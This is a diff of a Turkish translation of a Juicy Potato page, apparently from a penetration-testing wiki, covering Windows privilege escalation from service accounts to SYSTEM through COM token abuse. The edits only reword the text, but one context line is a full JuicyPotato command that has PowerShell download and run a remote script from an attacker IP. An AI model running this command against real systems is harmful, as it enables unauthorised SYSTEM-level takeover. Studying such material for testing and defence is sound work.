@@ -22,7 +22,7 @@ _Biraz meyve suyu eklenmiş_ [_RottenPotatoNG_](https://github.com/breenmachine/
 
 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi silahlandırmaya karar verdik: **Juicy Potato'ya merhaba deyin.**
 
-> Teori için, [Rotten Potato - Servis Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) sayfasını inceleyin ve bağlantılar ve referanslar zincirini takip edin.
+> Teori için, [Rotten Potato - Servis Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) adresine bakın ve bağlantılar ve referanslar zincirini takip edin.
 
 `BITS` dışında, kötüye kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunların sadece:
 
@@ -47,7 +47,7 @@ JuicyPotato, size şunları yapma imkanı tanır:
 - **İşlem Argümanı** _başlatılan işlem argümanlarını özelleştirin_
 - **RPC Sunucu adresi** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulaması yapabilirsiniz_
 - **RPC Sunucu portu** _harici bir sunucuya kimlik doğrulaması yapmak istiyorsanız ve güvenlik duvarı `135` portunu engelliyorsa…_
-- **TEST modu** _temelde test amaçlıdır, yani CLSID'leri test etmek için. DCOM oluşturur ve token kullanıcısını yazdırır. _Test için_ [_buraya_](http://ohpe.it/juicy-potato/Test/) _bakın._
+- **TEST modu** _temelde test amaçlıdır, yani CLSID'leri test etmek için. DCOM oluşturur ve token kullanıcısını yazdırır. _[_test için buraya bakın_](http://ohpe.it/juicy-potato/Test/)
 
 ### Kullanım <a href="#usage" id="usage"></a>
 ```
@@ -99,7 +99,7 @@ c:\Users\Public>
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### Yeni CMD Başlat (eğer RDP erişiminiz varsa)
+### Yeni bir CMD başlatın (eğer RDP erişiminiz varsa)
 
 ![](<../../images/image (300).png>)
 
@@ -117,7 +117,7 @@ https://ohpe.it/juicy-potato/CLSID/
 
 [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) dosyasını indirin ve PS oturumunuza yükleyin, ardından [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) dosyasını indirin ve çalıştırın. Bu betik, test edilecek olası CLSID'lerin bir listesini oluşturacaktır.
 
-Ardından [test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) dosyasını indirin (CLSID listesi ve juicypotato çalıştırılabilir dosyası için yolu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, bu CLSID'nin çalıştığı anlamına gelecektir**.
+Ardından [test_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) dosyasını indirin (CLSID listesi ve juicypotato çalıştırılabilir dosyası için yolu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, CLSID'nin çalıştığı anlamına gelecektir**.
 
 **-c parametresini kullanarak** çalışan CLSID'leri **kontrol edin**
 
